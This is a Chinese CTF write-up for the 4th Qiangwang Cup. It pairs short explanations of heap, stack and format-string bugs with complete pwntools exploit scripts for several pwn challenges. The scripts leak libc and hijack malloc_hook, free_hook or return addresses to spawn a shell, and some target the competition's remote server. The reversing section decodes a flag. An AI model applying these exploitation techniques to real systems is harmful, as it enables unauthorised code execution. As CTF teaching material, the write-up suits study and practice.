# 强网杯4th-wp


蓝叶春葳蕤，桂华秋皎洁。

<!--more-->

## babymessage

在leave_message处存在栈溢出漏洞，第一次能溢出8个字节，刚好可以修改rbp，当rbp被修改后，栈上保存的值也相应的修改。如果我们将rbp修改为name处的地址，那么用于判断是否大于0x100的变量将会变成name，我们就可以溢出更多的字节，实施ROP攻击。

```python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug    = lambda command=''            :gdb.attach(sh,command)

if args['REMOTE']:
    sh=remote('123.56.170.202',21342)
    libc=ELF("./libc-2.27.so")
else:
    sh=process("./babymessage")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

if args['I386']:
    context.arch='i386'
else:
    context.arch='amd64'

if args['DEBUG']:
    context.log_level='debug'

def choice(elect):
    ru(':')
    sl(str(elect))

def leave_name(name):
    choice(1)
    ru(':')
    s(name)

def leave_message(message):
    choice(2)
    ru(':')
    s(message)

def attack(payload):
    leave_name(p32(0x0fffffff))
    leave_message(p64(0)+p64(0x6010D0+4))
    leave_message(payload)

def exp():
    elf=ELF("./babymessage")
    #debug("b*0x0000000000400886\nc")
    puts_plt=elf.plt["puts"]
    puts_got=elf.got["puts"]
    rdi_ret=0x0000000000400ac3
    main=0x00000000004009DD
    payload=p64(0)+p64(0)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
    attack(payload)
    ru("!\n\n")
    puts_addr=u64(r(6).ljust(8,"\x00"))
    libc_base=puts_addr-libc.symbols["puts"]
    system=libc_base+libc.symbols["system"]
    bin_sh=libc_base+libc.search("/bin/sh").next()
    info_addr("libc_base",libc_base)
    info_addr("system",system)
    info_addr("bin_sh",bin_sh)
    payload=p64(0)+p64(0)+p64(0x0000000000400A55)+p64(rdi_ret)+p64(bin_sh)+p64(system)
    attack(payload)        
    itr()

exp()
```

## babynotes

在regist函数中，利用strcpy给name分配的堆块赋值，存在堆溢出，可以修改下一个chunk的size，利用该漏洞可以实现chunk overlapping。再利用fast bin attack可以修改malloc_hook和realloc_hook获得shell。

```python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug    = lambda command=''            :gdb.attach(sh,command)

if args['REMOTE']:
    libc=ELF("./libc-2.23.so")
    sh=remote("123.56.170.202",43121)
else:
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    sh=process("./babynotes")

if args['I386']:
    context.arch='i386'
else:
    context.arch='amd64'

if args['DEBUG']:
    context.log_level='debug'

def choice(elect):
    ru('>> ')
    sl(str(elect))

def add(index,size):
    choice(1)
    ru(':')
    sl(str(index))
    ru(':')
    sl(str(size))

def edit(index,content):
    choice(4)
    ru(':')
    sl(str(index))
    ru(':')
    sl(content)

def show(index):
    choice(2)
    ru(':')
    sl(str(index))

def delete(index):
    choice(3)
    ru(':')
    sl(str(index))

def regist(name,motto,age):
    ru("name: ")
    s(name)
    ru("motto: ")
    s(motto)
    ru("age: ")
    sl(str(age))

def reset(name,motto,age):
    choice(5)
    regist(name,motto,age)

def exp():
    regist("criss","aa",11)
    add(0,0x10)
    add(1,0x20)
    add(2,0x60) #
    add(3,0x10)
    delete(0)
    reset("a"*0x18,'a',0xa1)
    delete(1)
    add(1,0x20)
    show(2)
    ru("2: ")
    malloc_hook=u64(r(6).ljust(8,'\x00'))-88-0x10
    libc_base=malloc_hook-libc.symbols["__malloc_hook"]
    onegadget=libc_base+0xf1207
    realloc=libc_base+libc.symbols["realloc"]
    info_addr("libc_base",libc_base)
    info_addr("onegadget",onegadget)
    delete(3)
    add(3,0x60) #
    delete(3)
    edit(2,p64(malloc_hook-0x23))
    add(4,0x60)    
    add(3,0x60)
    edit(3,"\x00"*0xb+p64(onegadget)+p64(realloc+8))
    add(0,0x10)
    itr()

exp()
```

## Siri

在remind me to这个功能里面，有一个字符串漏洞，利用该漏洞可以泄漏栈，libc地址和修改返回地址为onegadget获得shell。

```python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug    = lambda command=''            :gdb.attach(sh,command)

if args['REMOTE']:
    sh=remote('123.56.170.202',12124)
else:
    sh=process("./Siri")

if args['I386']:
    context.arch='i386'
else:
    context.arch='amd64'

if args['DEBUG']:
    context.log_level='debug'

def attack(payload):
    ru(">>> ")
    sl("Hey Siri!")
    ru(">>> ")
    sl("Remind me to "+payload)

def exp():
    libc=ELF("./libc.so.6")
    attack("%7$p%83$p")
    ru("to ")
    stack=int(r(14),16)-8
    libc_start=int(r(14),16)-231
    libc_base=libc_start-libc.symbols["__libc_start_main"]
    info_addr("stack",stack)
    info_addr("libc_base",libc_base)
    one_gadget=libc_base+0x10a45c
    info_addr("one_gadget",one_gadget)
    length=27
    payload=''
    base=63
    for i in range(6):
        data=one_gadget&0xff
        if data > length:
            payload+="%"+str(data-length)+'c%'+str(base+i)+'$hhn'
        elif data<length:
            payload+="%"+str(256+data-length)+'c%'+str(base+i)+'$hhn'
        else:
            payload+='c%'+str(base+i)+'$hhn'
        length=data
        one_gadget>>=8
    if ((len(payload)+27)%8):
        length=len(payload)+8-((len(payload)+27)%8)
    else:
        length=len(payload)
    payload=payload.ljust(length,"\x01")+"\x01"*6+p64(0)*4
    for i in range(6):
        payload+=p64(stack+i)
    attack(payload)
    itr()

exp()
```

## 侧方

程序的加密逻辑是先对输入字符异或一个字节数据后，再按4个字节为一组，对每一组进行一次循环右移。

解密逻辑也就很清楚了，先将加密后的字符串，按4个为一组，进行一次循环左移，再疑惑相应字节数据，就可以获得flag。

```python
encode="L,x,|,d,T,U,w,e,\\,I,v,N,h,C,B,O,L,q,D,N,f,W,},I,m,F,Z,C,t,i,y,x,O,\\,P,W,^,e,b,D"
arry=encode.split(",")
key=[0x51,0x57,0x42,0x6c,0x6f,0x67,0x73]
flag=''
for i in range(len(arry)/4):
    temp=arry[i*4]
    arry[i*4]=arry[i*4+1]
    arry[i*4+1]=arry[i*4+2]
    arry[i*4+2]=arry[i*4+3]
    arry[i*4+3]=temp
encode="".join(arry)
print encode
for i in range(len(encode)):
    flag+=chr((ord(encode[i])-0x41)^key[i%7])
print flag
print hex(len(encode))
```

## direct

打开一个目录后，会在堆块中分配一个地址用于储存目录内的文件信息等，如果在这个目录堆块中构造几个假的堆块，并让其中一个堆块free到unsorted bin中，这样就可以泄漏libc的地址。程序在编辑功能中，用的是有符号数，这里的if判断就可以很容的绕过，进而实现堆溢出。为了实现释放目录堆块中的假堆块，我们需要先利用一次tcache攻击，来获得这个堆块，再释放。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote()
else:
	sh=process("./direct")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru(':')
	sl(str(elect))

def add(index,size):
	choice(1)
	ru(":")
	sl(str(index))
	ru(':')
	sl(str(size))

def edit(index,offset,size,content):
	choice(2)
	ru(":")
	sl(str(index))
	ru(":")
	sl(str(offset))
	ru(':')
	sl(str(size))
	ru(':')
	s(content)

def delete(index):
	choice(3)
	ru(':')
	sl(str(index))

def open_file():
	choice(4)

def close_file():
	choice(5)

def exp():
	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
	open_file()
	close_file()
	for i in range(7):
		add(i,0x80)
	edit(0,-0x8010+0x20,0x8010-0x20,p64(0)+p64(0x91)+b"\x00"*0x88+p64(0x91)+b"\x00"*0x88+p64(0x91))
	delete(0)
	delete(1)
	edit(2,-0x90,0x90,b"\xc0\x72")
	add(0,0x80)
	add(7,0x80)
	add(1,0x80)
	for i in range(8):
		delete(i)
	for i in range(7):
		add(6-i,0x80)
	edit(0,-0x8090+0x10,0x8090-0x10,"A"*16)
	close_file()
	ru("A"*5)
	malloc_hook=u64(r(6).ljust(8,"\x00"))-96-0x10
	libc_base=malloc_hook-libc.symbols["__malloc_hook"]
	free_hook=libc_base+libc.symbols["__free_hook"]
	system=libc_base+libc.symbols["system"]
	info_addr("libc_base",libc_base)
	delete(3)
	delete(0)
	edit(2,-0x90,0x90,p64(free_hook))
	add(8,0x80)
	add(9,0x80)
	edit(9,0,0x10,p64(system))
	edit(8,0,0x10,"/bin/sh")
	delete(8)
	itr()

exp()
````

## easypwn

读入字符函数存在off by null，利用这个漏洞可以实现堆重叠。由于程序调用了mallopt(1,0),该函数可以修改程序malloc的一些配置，这条语句的参数将会禁用fast bin功能，所以我们首先需要利用unsorted bin attack来修改global_max_fast，使其能使用fast bin。由于其输出用的是puts，所以可以攻击IO_file来泄漏libc，进而获得shell。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote()
else:
	sh=process("./easypwn")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru(':')
	sl(str(elect))

def add(size):
	choice(1)
	ru(':')
	sl(str(size))

def edit(index,content,full=False):
	choice(2)
	ru(':')
	sl(str(index))
	ru(':')
	if full:
		s(content)
	else:
		sl(content)

def delete(index):
	choice(3)
	ru(':')
	sl(str(index))

def exp():
	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
	add(0x10) #+0
	add(0x10) #+1
	add(0x68) #+2
	add(0x68) #+3
	add(0xf0) #+4
	add(0x68) #+5
	add(0x10) #+6
	delete(0) #-0
	edit(3,"\x00"*0x60+p64(0x120),full=True)
	delete(4) #-4
	add(0x210) #+0
	edit(0,"\x00"*0x18+p64(0x21)+"\x00"*0x18+p64(0x71)+"\x00"*0x68+p64(0x71)+"\x00"*0x68+p64(0x101))
	delete(3)  #-3
	add(0x68)  #+3
	delete(1) #-1
	edit(0,"\x00"*0x18+p64(0x21)+p64(0)+"\xe8\x37")
	add(0x10) #+1
	delete(5) #-5
	delete(2) #-2	
	edit(0,"\x00"*0x18+p64(0x21)+"\x00"*0x18+p64(0x71)+"\xb0\x70")
	edit(3,"\xdd\x25")
	add(0x68)
	add(0x68)
	add(0x68) #5
	edit(5,"\x00"*3+p64(0)*6+p64(0xfbad1800)+p64(0)*3+"\x00")
	ru("\xa3")
	stdout=u64(("\xa3"+r(5)).ljust(8,"\x00"))-131
	libc_base=stdout-libc.symbols["_IO_2_1_stdout_"]
	malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	realloc=libc_base+libc.symbols["realloc"]
	onegadget=libc_base+0x4527a
	info_addr("libc",libc_base)
	info_addr("malloc_hook",malloc_hook)
	info_addr("realloc",realloc)
	info_addr("onegadget",onegadget)
	delete(2)
	edit(0,"\x00"*0x18+p64(0x21)+"\x00"*0x18+p64(0x71)+p64(malloc_hook-0x23))
	add(0x68)
	add(0x68)
	edit(7,"\x00"*0xb+p64(onegadget)+p64(realloc))
	add(0x68)
	itr()

exp()
````

## galgame

在编辑函数处，存在堆溢出，利用该漏洞可以实现house of orange，进而将一个堆块释放，再分配的堆块将会保留其数据，进而可以达到泄漏。除了这一个漏洞，在编辑函数出，对于输入地址的限制是只需要gift数组寻址后的地址上有值就可以，这样的话就可以伪造一个地址在gift数组下方，来达到任意地址写的目的。而5功能就可以实现这个目的。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
	libc=ELF("./libc.so.6")
	sh=remote()
else:
	libc=ELF("./libc.so.6")
	sh=process("./Just_a_Galgame")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def debug(command=''):
	context.terminal = ['tmux', 'splitw', '-h']
	gdb.attach(sh,command)

def choice(elect):
	ru('>> ')
	sl(str(elect))

def add():
	choice(1)

def edit(index,content):
	choice(2)
	ru('>>')
	sl(str(index))
	ru('>>')
	s(content)

def add_big():
	choice(3)

def show():
	choice(4)

def message(msg):
	choice(5)
	ru("QAQ")
	s(msg)


def exp():
	libc=ELF("/glibc/2.27/amd64/lib/libc-2.27.so")
	debug("b*0x7ffff7b01ed2\nc")
	add()
	edit(0,b'a'*8+p64(0xd41))
	add_big()
	add()
	show()
	ru("1: ")
	malloc_hook=u64(r(6).ljust(8,b"\x00"))-96-0x10-0x600
	libc_base=malloc_hook-libc.symbols["__malloc_hook"]
	realloc=libc_base+libc.symbols["realloc"]
	onegadget=libc_base+0xdeed2
	info_addr("libc_base",libc_base)
	info_addr("onegadget",onegadget)
	info_addr("malloc_hook",malloc_hook)
	message(p64(malloc_hook-0x8-0x60))
	edit(8,p64(onegadget)+p64(realloc+2))
	add()
	itr()

exp()
````

## oldschool

mmap的编辑函数处存在溢出，可以实现任意地址写，利用在unsorted bin中的堆块，来泄漏libc，进而可以计算出目标地址与mmap基址之间的偏移。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote()
else:
	sh=process("./oldschool")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru(':')
	sl(str(elect))

def add(index,size):
	choice(1)
	ru(":")
	sl(str(index))
	ru(':')
	sl(str(size))


def edit(index,content):
	choice(2)
	ru(':')
	sl(str(index))
	ru(':')
	sl(content)

def show(index):
	choice(3)
	ru(':')
	sl(str(index))

def delete(index):
	choice(4)
	ru(':')
	sl(str(index))

def map_add(offset):
	choice(6)
	ru(":")
	sl(str(offset))

def map_edit(offset,value):
	choice(7)
	ru(":")
	sl(str(offset))
	ru(":")
	sl(str(value))

def exp():
	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
	debug("b*0x00000000000400B27\nc")
	add(0,0x80)
	add(1,0x80)
	delete(0)
	add(0,0x80)
	show(0)
	ru(": ")
	malloc_hook=u64(r(6).ljust(8,'\x00'))-88-0x10
	libc_base=malloc_hook-libc.symbols["__malloc_hook"]
	free_hook=libc_base+libc.symbols["__free_hook"]
	system=libc_base+libc.symbols["system"]
	info_addr("libc_base",libc_base)
	info_addr("free_hook",free_hook)
	info_addr("system",system	)
	map_add(0)
	offset=(free_hook-0xe0000000)/4
	map_edit(offset,system)
	#debug()
	itr()

exp()
````




